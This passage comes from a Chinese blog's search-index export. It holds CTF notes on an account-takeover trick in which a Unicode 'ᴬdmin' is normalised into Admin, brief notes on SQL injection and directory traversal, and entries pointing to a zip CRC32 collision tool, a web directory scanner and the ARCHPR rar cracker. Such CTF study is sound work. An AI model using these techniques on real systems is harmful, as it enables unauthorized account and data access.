rel="noopener">https://paper.tuisec.win/detail/a9ad1440249d95b</a><br>这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。<br>所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可。<br>作者：Miracle778<br>链接：<a href="https://www.jianshu.com/p/f92311564ad0" target="_blank" rel="noopener">https://www.jianshu.com/p/f92311564ad0</a><br>来源：简书</p></blockquote><p>这里的ᴬdmin很巧妙,直接用网页工具将A转换为Unicode很显然是不行的,我在另一处看到的WP用的ᴀdmin,而我用ᴀdmin注册的时候是不行的,最后看到了上面地址的WP用的ᴬdmin,最终成功了</p><hr><h2 id="summary"><a href="#summary" class="headerlink" title="summary:"></a>summary:</h2><hr><p>随便注: SQL注入单号号’闭合,语句一般都是&lt;SELECT first_name, last_name FROM users WHERE user_id = ‘&gt;所以可以用’来闭合一下—SQL注入一般步骤我看的是<a href="https://www.cnblogs.com/baimaoma/p/8608490.html" target="_blank" rel="noopener">Mr白猫的blog</a></p><p>WarmUp: 审计代码和本地包含,我现在的php水平还需要利用帮助手册才能勉强读懂代码的意思,最后还是看了dalao的WP才知道要目录穿越一下…</p><p>admin: 这题的关键就在于上面WP写的原理</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC32</title>
      <link href="/2019/06/30/toolscrc32/"/>
      <url>/2019/06/30/toolscrc32/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">CRC32</a></p><p>取自GitHub——theonlypwner</p><p>zip的CRC碰撞</p><p>可以这样操作：python crc32.py reverse <strong>0x2f5ead52</strong>(加粗部分为CRC)</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebDirScan</title>
      <link href="/2019/06/30/toolswebdirscan/"/>
      <url>/2019/06/30/toolswebdirscan/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/TuuuNya/webdirscan" target="_blank" rel="noopener">webdirscan</a></p><p>取自GitHub——TuuuNya</p><p>可以这样操作：py2 webdirscan.py <a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PDFChange</title>
      <link href="/2019/06/29/swpdfchange/"/>
      <url>/2019/06/29/swpdfchange/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1_vZNlzYk1UOwpjB2VlinnA" target="_blank" rel="noopener">PDFChange</a><br>提取码：8iai</p><p>取自微信公众号——软件安装管家</p><p>公众号有详细的安装教程</p>]]></content>
      
      
      
        <tags>
            
            <tag> SW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AndroidPhoneGoogleCAM</title>
      <link href="/2019/06/29/toolsandroidphonegooglecam/"/>
      <url>/2019/06/29/toolsandroidphonegooglecam/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/share/init?surl=aNkgqyTLXfoz1uSNV90j9A" target="_blank" rel="noopener">GCAM</a></p><p>提取码：7777</p><p>取自Weibo——阿狗酱</p><p>建议关注微博，他会不定时更新</p><p>2019.7更新了小米8、mix3、mix2s，6x、PocophoneF1的<a href="https://www.celsoazevedo.com/files/android/google-camera/dev-urikill/#apk1026" target="_blank" rel="noopener">urikill版GCAM</a>，个人觉得效果更好。（标题的超链接也更新了，包括了urikill，也可以urikill版GCAM直达这个版本）</p>]]></content>
      
      
      
        <tags>
            
            <tag> SW </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARCHPR</title>
      <link href="/2019/06/29/toolsarchpr/"/>
      <url>/2019/06/29/toolsarchpr/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1fGGGdT2vxiFDFUyJEkzvLw" target="_blank" rel="noopener">ARCHPR</a>–爆rar的工具</p><p>提取码：nqtv</p>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
